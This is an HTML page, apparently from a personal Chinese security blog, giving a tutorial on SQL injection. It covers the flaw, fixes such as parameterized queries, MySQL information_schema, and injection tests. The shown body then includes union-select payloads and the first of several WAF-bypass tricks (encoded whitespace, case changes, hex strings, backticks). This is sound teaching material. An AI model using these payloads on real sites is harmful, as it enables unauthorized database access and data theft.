@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.jpg">
+  <link rel="mask-icon" href="/images/logo.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"squar3c.github.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="1. 概述漏洞描述 ​	Web程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。 漏洞存在条件  参数用户可控。 参数带入数据库查询。  测试方法 ​	在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="https://squar3c.github.com/posts/31899/index.html">
+<meta property="og:site_name" content="squar3cの秘密小屋">
+<meta property="og:description" content="1. 概述漏洞描述 ​	Web程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。 漏洞存在条件  参数用户可控。 参数带入数据库查询。  测试方法 ​	在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-04T14:43:25.000Z">
+<meta property="article:modified_time" content="2025-03-04T16:37:13.870Z">
+<meta property="article:author" content="squar3c">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://squar3c.github.com/posts/31899/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://squar3c.github.com/posts/31899/","path":"posts/31899/","title":"sql注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sql注入 | squar3cの秘密小屋</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/logo.jpg" alt="squar3cの秘密小屋">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">squar3cの秘密小屋</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">爱我所爱</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">1. 概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-MySQL%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 MySQL相关知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 判断是否存在注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-SQL%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 SQL注释符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 SQL注入分类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">2. SQL注入绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%A9%BA%E6%A0%BC%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 空格字符绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 大小写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%B5%AE%E7%82%B9%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 浮点数绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-NULL%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 NULL绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 引号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-%E6%B7%BB%E5%8A%A0%E5%BA%93%E5%90%8D%E7%BB%95%E8%BF%87"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 添加库名绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-%E5%8E%BB%E9%87%8D%E5%A4%8D%E7%BB%95%E8%BF%87"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 去重复绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-8-%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.8.</span> <span class="nav-text">2.8 反引号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-9-%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="nav-number">2.9.</span> <span class="nav-text">2.9 语言特性绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-10-%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.10.</span> <span class="nav-text">2.10 逗号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-11-or-and-xor-not%E7%BB%95%E8%BF%87"><span class="nav-number">2.11.</span> <span class="nav-text">2.11 or and xor not绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-12-ASCII%E5%AD%97%E7%AC%A6%E5%AF%B9%E6%AF%94%E7%BB%95%E8%BF%87"><span class="nav-number">2.12.</span> <span class="nav-text">2.12 ASCII字符对比绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-13-%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.13.</span> <span class="nav-text">2.13 等号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-14-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.14.</span> <span class="nav-text">2.14 双写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-15-%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.15.</span> <span class="nav-text">2.15 二次编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-16-%E5%8F%82%E6%95%B0%E6%8B%86%E5%88%86%E7%BB%95%E8%BF%87"><span class="nav-number">2.16.</span> <span class="nav-text">2.16 参数拆分绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-17-%E7%94%9F%E5%83%BB%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">2.17.</span> <span class="nav-text">2.17 生僻函数绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-18-%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87"><span class="nav-number">2.18.</span> <span class="nav-text">2.18 分块传输绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-19-%E4%BF%A1%E4%BB%BB%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">2.19.</span> <span class="nav-text">2.19 信任白名单绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-20-pipline%E7%BB%95%E8%BF%87"><span class="nav-number">2.20.</span> <span class="nav-text">2.20 pipline绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-21-%E5%88%A9%E7%94%A8multipart-form-data%E7%BB%95%E8%BF%87"><span class="nav-number">2.21.</span> <span class="nav-text">2.21 利用multipart&#x2F;form-data绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-22-order-by-%E7%BB%95%E8%BF%87"><span class="nav-number">2.22.</span> <span class="nav-text">2.22 order by 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-23-%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="nav-number">2.23.</span> <span class="nav-text">2.23 修改请求方式绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-24-%E5%A4%A7%E9%87%8F%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">2.24.</span> <span class="nav-text">2.24 大量字符绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-25-%E8%8A%B1%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">2.25.</span> <span class="nav-text">2.25 花括号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-26-union-select%E7%BB%95%E8%BF%87"><span class="nav-number">2.26.</span> <span class="nav-text">2.26 union select绕过</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="squar3c"
+      src="/images/logo.jpg">
+  <p class="site-author-name" itemprop="name">squar3c</p>
+  <div class="site-description" itemprop="description">爱就在眼前</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://ma3t1n.github.io/" title="https:&#x2F;&#x2F;ma3t1n.github.io&#x2F;" rel="noopener" target="_blank">Ma3t1n</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://squar3c.github.com/posts/31899/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.jpg">
+      <meta itemprop="name" content="squar3c">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="squar3cの秘密小屋">
+      <meta itemprop="description" content="爱就在眼前">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="sql注入 | squar3cの秘密小屋">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-03-04 22:43:25" itemprop="dateCreated datePublished" datetime="2025-03-04T22:43:25+08:00">2025-03-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-05 00:37:13" itemprop="dateModified" datetime="2025-03-05T00:37:13+08:00">2025-03-05</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>11 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p><strong>漏洞描述</strong></p>
+<p>​	Web程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p>
+<p><strong>漏洞存在条件</strong></p>
+<ul>
+<li>参数用户可控。</li>
+<li>参数带入数据库查询。</li>
+</ul>
+<p><strong>测试方法</strong></p>
+<p>​	在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。</p>
+<p><strong>修复方法</strong></p>
+<p>​	在代码层最佳的防御SQL注入的手段是SQL语句的<strong>预编译和绑定变量</strong>。</p>
+<p>​	（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
+<p>​	（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>
+<p>​	（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>
+<p>​	（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 </p>
+<p>​	（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 </p>
+<p>​	（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>
+<p>​	（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
+<h3 id="1-1-MySQL相关知识"><a href="#1-1-MySQL相关知识" class="headerlink" title="1.1 MySQL相关知识"></a>1.1 MySQL相关知识</h3><p>​	在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>
+<h3 id="1-2-判断是否存在注入"><a href="#1-2-判断是否存在注入" class="headerlink" title="1.2 判断是否存在注入"></a>1.2 判断是否存在注入</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="string">'1'</span><span class="keyword">or</span><span class="string">'1'</span><span class="operator">=</span><span class="string">'1'</span></span><br><span class="line">id<span class="operator">=</span>"1"<span class="keyword">or</span>"1"<span class="operator">=</span>"1"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>有回显</strong>：页面有数据信息返回。</p>
+<p><strong>无回显</strong>：输入不同语句，页面无任何变化。</p>
+<h3 id="1-3-SQL注释符"><a href="#1-3-SQL注释符" class="headerlink" title="1.3 SQL注释符"></a>1.3 SQL注释符</h3><p><code>#</code>：单行注释，常编码为%23。</p>
+<p><code>--空格</code>：单行注释，注意后面有个空格。</p>
+<p><code>/**/</code>：多行注释，至少存在两处的注入，也常用来作为空格绕过。</p>
+<h3 id="1-4-SQL注入分类"><a href="#1-4-SQL注入分类" class="headerlink" title="1.4 SQL注入分类"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>
+<p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>
+<p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>
+<h2 id="2-SQL注入绕过"><a href="#2-SQL注入绕过" class="headerlink" title="2. SQL注入绕过"></a>2. SQL注入绕过</h2><h3 id="2-1-空格字符绕过"><a href="#2-1-空格字符绕过" class="headerlink" title="2.1 空格字符绕过"></a>2.1 空格字符绕过</h3><p><code>%a0</code>：空格</p>
+<p><code>%09</code>：TAB键（水平）</p>
+<p><code>%0a</code>：新建一行</p>
+<p><code>%0c</code>：新的一页</p>
+<p><code>%0d</code>：return功能</p>
+<p><code>%0b</code>：TAB键（垂直）</p>
+<p><code>%00</code>：空字符</p>
+<p><code>/**/</code>：替换空格</p>
+<p><code>/*!*/</code>：内联注释</p>
+<h3 id="2-2-大小写绕过"><a href="#2-2-大小写绕过" class="headerlink" title="2.2 大小写绕过"></a>2.2 大小写绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">UniOn</span> <span class="keyword">SelEcT</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-3-浮点数绕过"><a href="#2-3-浮点数绕过" class="headerlink" title="2.3 浮点数绕过"></a>2.3 浮点数绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-4-NULL绕过"><a href="#2-4-NULL绕过" class="headerlink" title="2.4 NULL绕过"></a>2.4 NULL绕过</h3><p><code>\N</code>代表NULL</p>
+<h3 id="2-5-引号绕过"><a href="#2-5-引号绕过" class="headerlink" title="2.5 引号绕过"></a>2.5 引号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>"1" #双引号绕过</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="number">0x61646D696E</span>; # 字符串转换为<span class="number">16</span>进制</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name)</span><br><span class="line"><span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">'users'</span> limit <span class="number">1</span>),<span class="number">4</span>; # 如果开启gpc，整数型也可以用十六进制绕过</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-6-添加库名绕过"><a href="#2-6-添加库名绕过" class="headerlink" title="2.6 添加库名绕过"></a>2.6 添加库名绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> test.users;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-7-去重复绕过"><a href="#2-7-去重复绕过" class="headerlink" title="2.7 去重复绕过"></a>2.7 去重复绕过</h3><p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() fromusers;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="2-8-反引号绕过"><a href="#2-8-反引号绕过" class="headerlink" title="2.8 反引号绕过"></a>2.8 反引号绕过</h3><p>字段加反引号可以绕过一些WAF拦截。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> `test.users`;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
